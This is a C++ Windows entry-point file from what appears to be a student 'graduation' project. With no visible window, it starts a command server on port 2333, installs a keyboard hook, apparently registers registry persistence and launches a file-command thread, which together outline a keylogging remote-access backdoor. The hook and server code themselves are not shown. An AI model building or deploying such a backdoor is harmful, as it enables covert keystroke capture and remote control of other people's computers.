//graduation.cpp: 定义应用程序的入口点。
//

#include "stdafx.h"
#include "graduation.h"
#include "CmdServer.h"
#include "KeyboardHook.h"
#include "RegisterHEKY.h"
#define MAX_LOADSTRING 100


DWORD WINAPI fileCmdMain(LPVOID lpParameter);
// 全局变量: 
HINSTANCE hInst;         
// 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此放置代码。

    // 初始化全局字符串
	
    MSG msg;
	CmdServer cmdServer(2333);
	cmdServer.listenAtPort();
	KeyboardHook keyboardHook(hInstance);
    // 主消息循环: 
	RegisterHEKY reg;
	CreateThread(NULL, 0, fileCmdMain, NULL, 0, NULL);
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        
    }

    return (int) msg.wParam;
}



